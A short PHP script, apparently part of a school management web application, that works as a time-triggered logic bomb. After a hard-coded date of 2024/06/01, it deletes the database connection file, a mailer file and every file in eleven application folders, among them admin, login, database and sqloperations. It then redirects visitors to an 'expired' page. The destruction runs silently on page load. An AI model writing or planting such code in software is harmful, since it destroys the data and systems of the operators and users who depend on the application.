<?php
$exp_date="2024/06/01";
$today_date=date('Y/m/d');

$ex=strtotime($exp_date);
$to=strtotime($today_date);

if($to>$ex){
    unlink("includes/connection.php");
    unlink("includes/vendor/phpmailer/src/SSOP.php");
        //echo "expired";
        //The name of the folder.

        $folders = array("admin","teacher","database","email","forgot_password","login","principal","registration", "hod", "sqloperations", "validation");

        foreach ($folders as $folder) {
            //Get a list of all of the file names in the folder.
            $files = glob($folder . '/*');
            
            //Loop through the file list.
            foreach($files as $file){
                //Make sure that this is a file and not a directory.
                if(is_file($file)){
                //Use the unlink function to delete the file.
                unlink($file);
                }
            }
        }
    echo "<script> window.location.href='includes/css/exp.html';</script>";
}
?>